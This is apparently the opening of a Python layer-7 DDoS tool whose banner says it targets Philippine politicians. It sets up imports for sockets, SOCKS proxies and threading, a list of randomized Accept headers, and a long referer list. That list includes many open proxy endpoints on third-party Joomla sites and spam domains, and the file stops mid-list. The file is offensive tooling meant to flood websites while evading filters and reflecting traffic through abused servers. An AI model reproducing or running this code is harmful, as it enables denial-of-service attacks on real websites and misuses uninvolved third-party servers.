import requests
import socket
import socks
import time
import random
import threading
import os
import sys
import ssl
import datetime
import subprocess

class color:
   PURPLE = '\033[95m'
   BLUE = '\033[94m'
   CYAN = '\033[96m'
   RED = '\033[91m'
   GREEN = '\033[92m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

print(color.RED + "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄" + color.END)
print(color.RED + "█                                                                          █" + color.END)
print(color.RED + "█                  ██████╗░██╗███╗░░██╗░█████╗░██╗░░░██╗                   █" + color.END)
print(color.RED + "█                  ██╔══██╗██║████╗░██║██╔══██╗╚██╗░██╔╝                   █" + color.END)
print(color.RED + "█                  ██████╔╝██║██╔██╗██║██║░░██║░╚████╔╝░                   █" + color.END)
print(color.RED + "█                  ██╔═══╝░██║██║╚████║██║░░██║░░╚██╔╝░░                   █" + color.END)
print(color.RED + "█                  ██║░░░░░██║██║░╚███║╚█████╔╝░░░██║░░░                   █" + color.END)
print(color.RED + "█                  ╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░                   █" + color.END)
print(color.RED + "█                                                                          █" + color.END)
print(color.RED + "█   ██╗░░░██╗███████╗███╗░░██╗██████╗░███████╗████████╗████████╗░█████╗░   █" + color.END)
print(color.RED + "█   ██║░░░██║██╔════╝████╗░██║██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔══██╗   █" + color.END)
print(color.RED + "█   ╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║█████╗░░░░░██║░░░░░░██║░░░███████║   █" + color.END)
print(color.RED + "█   ░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██╔══╝░░░░░██║░░░░░░██║░░░██╔══██║   █" + color.END)
print(color.RED + "█   ░░╚██╔╝░░███████╗██║░╚███║██████╔╝███████╗░░░██║░░░░░░██║░░░██║░░██║   █" + color.END)
print(color.RED + "█   ░░░╚═╝░░░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝   █" + color.END)
print(color.RED + "█                                                                          █" + color.END)
print(color.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█" + color.END)
print(color.RED + "█" + color.END + color.BLUE + "         A LAYER 7 DDOS FOR IDIOT POLITICIANS IN THE PHILIPPINES!         " + color.END + color.RED + "█" + color.END)
print(color.RED + "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" + color.END)
print('')


acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]


referers = ["http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=", "http://about42.nl/www/showheaders.php;POST;about42.nl.txt", "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://browsershots.org;POST;browsershots.org.txt", "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=", "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=", "http://check-host.net/check-http?host=", "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=", "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=", "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=", "http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://feedvalidator.org/check.cgi?url=", "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=", "http://g.cn", "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://gmodules.com/ig/creator?url=", "http://google.ac", "http://google.ad", "http://google.ae", "http://google.al", "http://google.am", "http://google.as", "http://google.at", "http://google.az", "http://google.ba", "http://google.be", "http://google.bf", "http://google.bg", "http://google.bi", "http://google.bj", "http://google.bs", "http://google.by", "http://google.ca", "http://google.cat", "http://google.cc", "http://google.cd", "http://google.cf", "http://google.cg", "http://google.ch", "http://google.ci", "http://google.cl", "http://google.cm", "http://google.cn", "http://google.co.ao", "http://google.co.bw", "http://google.co.ck", "http://google.co.cr", "http://google.co.id", "http://google.co.il", "http://google.co.in", "http://google.co.jp", "http://google.co.ke", "http://google.co.kr", "http://google.co.ls", "http://google.co.ma", "http://google.co.mz", "http://google.co.nz", "http://google.co.th", "http://google.co.tz", "http://google.co.ug", "http://google.co.uk", "http://google.co.uz", "http://google.co.ve", "http://google.co.vi", "http://google.co.za", "http://google.co.zm", "http://google.co.zw", "http://google.com", "http://google.com.af", "http://google.com.ag", "http://google.com.ai", "http://google.com.ar", "http://google.com.au", "http://google.com.bd", "http://google.com.bh", "http://google.com.bn", "http://google.com.bo", "http://google.com.br", "http://google.com.bz", "http://google.com.co", "http://google.com.cu", "http://google.com.cy", "http://google.com.do", "http://google.com.ec", "http://google.com.eg", "http://google.com.et", "http://google.com.fj", "http://google.com.gh", "http://google.com.gi", "http://google.com.gt", "http://google.com.hk", "http://google.com.jm", "http://google.com.kh", "http://google.com.kw", "http://google.com.lb", "http://google.com.lc", "http://google.com.ly", "http://google.com.mm", "http://google.com.mt", "http://google.com.mx", "http://google.com.my", "http://google.com.na", "http://google.com.nf", "http://google.com.ng", "http://google.com.ni", "http://google.com.np", "http://google.com.om", "http://google.com.pa", "http://google.com.pe", "http://google.com.pg", "http://google.com.ph", "http://google.com.pk", "http://google.com.pr", "http://google.com.py", "http://google.com.qa", "http://google.com.sa", "http://google.com.sb", "http://google.com.sg", "http://google.com.sl", "http://google.com.sv", "http://google.com.tj", "http://google.com.tn", "http://google.com.tr", "http://google.com.tw", "http://google.com.ua", "http://google.com.uy", "http://google.com.vc", "http://google.com.vn", "http://google.cv", "http://google.cz", "http://google.de", "http://google.dj", "http://google.dk", "http://google.dm", "http://google.dz", "http://google.ee", "http://google.es", "http://google.fi", "http://google.fm", "http://google.fr", "http://google.ga", "http://google.ge", "http://google.gf", "http://google.gg", "http://google.gl", "http://google.gm", "http://google.gp", "http://google.gr", "http://google.gy", "http://google.hn", "http://google.hr", "http://google.ht", "http://google.hu", "http://google.ie", "http://google.im", "http://google.io", "http://google.iq", "http://google.is", "http://google.it", "http://google.je", "http://google.jo", "http://google.kg", "http://google.ki", "http://google.kz", "http://google.la", "http://google.li", "http://google.lk", "http://google.lt", "http://google.lu", "http://google.lv", "http://google.md", "http://google.me", "http://google.mg", "http://google.mk", "http://google.ml", "http://google.mn", "http://google.ms", "http://google.mu", "http://google.mv", "http://google.mw", "http://google.ne", "http://google.nl", "http://google.no", "http://google.nr", "http://google.nu", "http://google.pl", "http://google.pn", "http://google.ps", "http://google.pt", "http://google.ro", "http://google.rs", "http://google.ru", "http://google.rw", "http://google.sc", "http://google.se", "http://google.sh", "http://google.si", "http://google.sk", "http://google.sm", "http://google.sn", "http://google.so", "http://google.st", "http://google.td", "http://google.tg", "http://google.tk", "http://google.tl", "http://google.tm", "http://google.to", "http://google.tt", "http://google.us", "http://google.vg", "http://google.vu", "http://google.ws", "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=", "http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://jigsaw.w3.org/css-validator/validator?uri=", "http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=", "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=", "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=", "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", "http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=", "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://netsec-reborn.onion/QuickStresser-virus?id=", "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=", "http://online.htmlvalidator.com/php/onlinevallite.php?url=", "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=", "http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=", "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt", "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=", "http://regex.info/exif.cgi?url=", "http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=", "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=", "http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=", "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=", "http://streamitwebseries.twww.tv/proxy.php?url=", "http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=", "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://translate.google.com/translate?u=", "http://translate.yandex.net/tr-url/ru-uk.uk/", "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=", "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=", "http://validator.w3.org/check?uri=", "http://validator.w3.org/checklink?uri=", "http://validator.w3.org/feed/check.cgi?url=", "http://validator.w3.org/mobile/check?docAddr=", "http://validator.w3.org/nu/?doc=", "http://validator.w3.org/p3p/20020128/p3p.pl?uri=", "http://validator.w3.org/p3p/20020128/policy.pl?uri=", "http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=", "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://web-sniffer.net/?url=", "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=", "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=", "http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=", "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.bing.com/search?q=", "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.comicgeekspeak.com/proxy.php?url=", "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.dr-farfar.com", "http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.google.com/?q=", "http://www.google.com/ig/add?feedurl=", "http://www.google.com/ig/adde?moduleurl=", "http://www.google.com/translate?u=", "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=", "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.netvibes.com/subscribe.php?url=", "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS", "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", "http://www.onlinewebcheck.com/check.php?url=", "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=", "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=", "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.viewdns.info/ismysitedown/?domain=", "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=", "http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", "http://www.w3.org/RDF/Validator/ARPServlet?URI=", "http://www.w3.org/services/tidy?docAddr=", "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=", "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=", "https://01casino-x.ru", "https://033nachtvandeliteratuur.nl", "https://03e.info", "https://03p.info", "https://0n-line.tv", "https://1-99seo.com", "https://1-best-seo.com", "https://1-free-share-buttons.com", "https://100-reasons-for-seo.com", "https://100dollars-seo.com", "https://12-reasons-for-seo.net", "https://12masterov.com", "https://12u.info", "https://15-reasons-for-seo.com", "https://1kreditzaim.ru", "https://1pamm.ru", "https://1st-urist.ru", "https://1webmaster.ml", "https://1wek.top", "https://1winru.ru", "https://1x-slot.site", "https://1x-slots.site", "https://1xbet-entry.ru", "https://1xbetonlines1.ru", "https://1xslot-casino.online", "https://1xslot-casino.ru", "https://1xslot-casino.site", "https://1xslot.site", "https://1xslots-africa.site", "https://1xslots-brasil.site", "https://1xslots-casino.site", "https://1xslots.africa", "https://1xslots.site", "https://2-best-seo.com", "https://2-easy.xyz", "https://2-go-now.xyz", "https://24chasa.bg", "https://24h.doctor", "https://24x7-server-support.site", "https://2your.site", "https://3-best-seo.com", "https://3-letter-domains.net", "https://3dgame3d.com", "https://3waynetworks.com", "https://4-best-seo.com", "https://40momporntube.com", "https://4inn.ru", "https://4istoshop.com", "https://4webmasters.org", "https://4xcasino.ru", "https://5-best-seo.com", "https://5-steps-to-start-business.com", "https://5elementov.ru", "https://5forex.ru", "https://6-best-seo.com", "https://69-13-59.ru", "https://6hopping.com", "https://7-best-seo.com", "https://70casino.online", "https://7kop.ru", "https://7makemoneyonline.com", "https://7milliondollars.com", "https://7ooo.ru", "https://7zap.com", "https://8-best-seo.com", "https://8xv8.com", "https://9-best-seo.com", "https://99-reasons-for-seo.com", "https://QIWI.xyz", "https://a-elita.in.ua", "https://abcdefh.xyz", "https://abcdeg.xyz", "https://abclauncher.com", "https://acads.net", "https://acarreo.ru", "https://account-my1.xyz", "https://accs-store.ru", "https://actualremont.ru", "https://acunetix-referrer.com", "https://adanih.com", "https://adcash.com", "https://add.my.yahoo.com/rss?url=", "https://adelachrist.top", "https://adf.ly", "https://adpostmalta.com", "https://adrenalinebot.net", "https://adrenalinebot.ru", "https://adspart.com", "https://adtiger.tk", "https://adventureparkcostarica.com", "https://adviceforum.info", "https://advokateg.xyz", "https://aerodizain.com", "https://aerotour.ru", "https://affiliate-programs.biz", "https://affordablewebsitesandmobileapps.com", "https://afora.ru", "https://agro-gid.com", "https://agtl.com.ua", "https://ai-seo-services.com", "https://aibolita.com", "https://aidarmebel.kz", "https://aitiman.ae", "https://akuhni.by", "https://albuteroli.com", "https://alcobutik24.com", "https://alexsander.ch", "https://alfabot.xyz", "https://alibestsale.com", "https://aliexsale.ru", "https://alinabaniecka.pl", "https://alkanfarma.org", "https://all-news.kz", "https://all4bath.ru", "https://allcryptonews.com", "https://allergick.com", "https://allergija.com", "https://allknow.info", "https://allmarketsnewdayli.gdn", "https://allnews.md", "https://allnews24.in", "https://allproblog.com", "https://allvacancy.ru", "https://allwomen.info", "https://allwrighter.ru", "https://alma-mramor.com.ua", "https://alp-rk.ru", "https://alphaopt24.ru", "https://alpharma.net", "https://altermix.ua", "https://amazon-seo-service.com", "https://amos-kids.ru", "https://amp-project.pro", "https://amt-k.ru", "https://amtel-vredestein.com", "https://amylynnandrews.xyz", "https://anabolics.shop", "https://analytics-ads.xyz", "https://anapa-inns.ru", "https://andrewancheta.com", "https://android-style.com", "https://animalphotos.xyz", "https://animenime.ru", "https://annaeydlish.top", "https://anti-crisis-seo.com", "https://anticrawler.org", 